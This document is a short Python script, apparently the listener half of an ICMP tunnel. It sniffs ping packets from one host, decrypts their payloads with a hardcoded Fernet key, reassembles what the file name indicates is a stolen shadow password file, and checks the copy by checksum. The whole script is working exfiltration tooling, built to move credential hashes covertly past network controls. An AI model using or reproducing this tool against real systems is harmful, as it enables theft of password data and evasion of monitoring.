from scapy import all as scapy
from simple_file_checksum import get_checksum
from cryptography.fernet import Fernet

file_path = 'shadow_file.txt'

key = 'FJuvqZPlbgevpc5bLJJUM-DbIel77yAc_ngCmykfRiw='
fernet = Fernet(key.encode('utf-8'))

shadow_sign = ''
copy_sign = ''
i = 0

# Clear file:
log_file = open(file_path, 'w')
log_file.write('')
log_file.close()

pkt = scapy.sniff(iface="enp0s8", filter="icmp and icmp[0]=8 and host 10.104.1.80", stop_filter=lambda x: x.payload["Raw"].load.decode('utf-8')=='EOF')

def get_load(packet) -> str :
    return packet.payload["Raw"].load.decode('utf-8')

for p in pkt :
    data = get_load(p)
    if data == 'EOF':
        break
    data = fernet.decrypt(data).decode()
    if i == 0:
        shadow_sign = data
    else :
        log_file = open(file_path, 'a')
        log_file.write(data)
        log_file.close()
    i+=1

copy_sign = get_checksum(file_path)
if shadow_sign == copy_sign :
    print("Copy success")
else :
    print("File not complete")
    print(copy_sign)
    print(shadow_sign)
exit(0)
